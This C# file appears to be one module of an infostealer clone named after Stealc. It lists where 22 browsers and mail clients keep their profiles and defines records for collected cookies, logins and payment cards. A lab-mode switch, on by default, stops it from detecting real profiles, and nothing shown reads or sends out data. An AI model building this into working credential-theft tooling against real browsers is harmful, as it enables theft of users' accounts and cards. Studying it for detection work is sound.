namespace Stealc.Grabber.Grabbers;

public sealed class BrowserGrabber
{
    private static readonly (string Name, string RelPath)[] ChromiumBrowsers =
    [
        ("Google Chrome",          @"Google\Chrome\User Data"),
        ("Microsoft Edge",         @"Microsoft\Edge\User Data"),
        ("Brave",                  @"BraveSoftware\Brave-Browser\User Data"),
        ("Opera",                  @"Opera Software\Opera Stable"),
        ("Opera GX",              @"Opera Software\Opera GX Stable"),
        ("Vivaldi",                @"Vivaldi\User Data"),
        ("Yandex Browser",         @"Yandex\YandexBrowser\User Data"),
        ("Chromium",               @"Chromium\User Data"),
        ("Epic Privacy Browser",   @"Epic Privacy Browser\User Data"),
        ("CentBrowser",            @"CentBrowser\User Data"),
        ("7Star",                  @"7Star\7Star\User Data"),
        ("Iridium",                @"Iridium\User Data"),
        ("Comodo Dragon",          @"Comodo\Dragon\User Data"),
        ("Torch",                  @"Torch\User Data"),
        ("Amigo",                  @"Amigo\User Data"),
        ("Sputnik",                @"Sputnik\Sputnik\User Data"),
        ("Slimjet",                @"FlashPeak\SlimBrowser\User Data"),
    ];

    private static readonly (string Name, string RelPath)[] GeckoBrowsers =
    [
        ("Mozilla Firefox",        @"Mozilla\Firefox\Profiles"),
        ("Waterfox",               @"Waterfox\Profiles"),
        ("Pale Moon",              @"Moonchild Productions\Pale Moon\Profiles"),
        ("LibreWolf",              @"librewolf\Profiles"),
        ("Thunderbird",            @"Thunderbird\Profiles"),
    ];

    private readonly bool _labMode;

    public BrowserGrabber(bool labMode = true) => _labMode = labMode;

    public List<BrowserProfile> Scan()
    {
        var results = new List<BrowserProfile>();
        var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        foreach (var (name, rel) in ChromiumBrowsers)
        {
            var path = Path.Combine(appData, rel);
            var exists = !_labMode && Directory.Exists(path);
            results.Add(new BrowserProfile
            {
                BrowserName = name, ProfilePath = path, Engine = "chromium", Found = exists
            });
        }

        var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        foreach (var (name, rel) in GeckoBrowsers)
        {
            var path = Path.Combine(roaming, rel);
            var exists = !_labMode && Directory.Exists(path);
            results.Add(new BrowserProfile
            {
                BrowserName = name, ProfilePath = path, Engine = "gecko", Found = exists
            });
        }

        return results;
    }

    public int TotalTargets => ChromiumBrowsers.Length + GeckoBrowsers.Length;
}

public sealed class BrowserProfile
{
    public required string BrowserName { get; init; }
    public required string ProfilePath { get; init; }
    public required string Engine { get; init; }
    public bool Found { get; init; }
    public List<string> Cookies { get; init; } = [];
    public List<string> Logins { get; init; } = [];
    public List<string> Cards { get; init; } = [];
}
